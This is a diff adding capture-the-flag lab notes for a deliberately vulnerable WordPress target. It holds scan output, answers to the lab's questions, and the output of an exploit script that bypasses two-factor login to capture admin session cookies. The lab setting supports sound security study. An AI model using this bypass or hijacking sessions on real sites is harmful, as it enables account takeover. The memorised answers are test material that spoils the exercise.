@@ -39,3 +39,26 @@ Target: http://vulnerablewp.thm:8080/
 [00:24:51] 200 -    0B  - /wp-includes/rss-functions.php
 [00:24:51] 200 -    5KB - /wp-includes/
 
+Q1) --> Rsssl_Two_Factor_On_Board_Api 
+Q2) --> check_login_and_get_user  
+
+Exploit.py output:
+------------------
+
+Request successful!
+
+Cookie 1:
+Cookie Name: wordpress_eb51341dc89ca85477118d98a618ef6f
+Cookie Value: admin|1740803147|zSM9klQLGx6hTTarBkrqKjUVRV0GHkFl84FxmNSOGvB|5ee39e2d68626badff98b4d10dad4b335398b64e41744c48c115c7acee2bd114
+
+Cookie 2:
+Cookie Name: wordpress_logged_in_eb51341dc89ca85477118d98a618ef6f
+Cookie Value: admin|1740803147|zSM9klQLGx6hTTarBkrqKjUVRV0GHkFl84FxmNSOGvB|a5a6d1c344d88a8c3ee59bc49fef45ac73b6c0eb6382bf9589cc1eef5224e125
+
+Q3) --> admin@fake.thm 
+Q4) --> jack 
+Q5) --> post 
+
+Q6) --> nay 
+
+--------------------------------------------------------------------------------
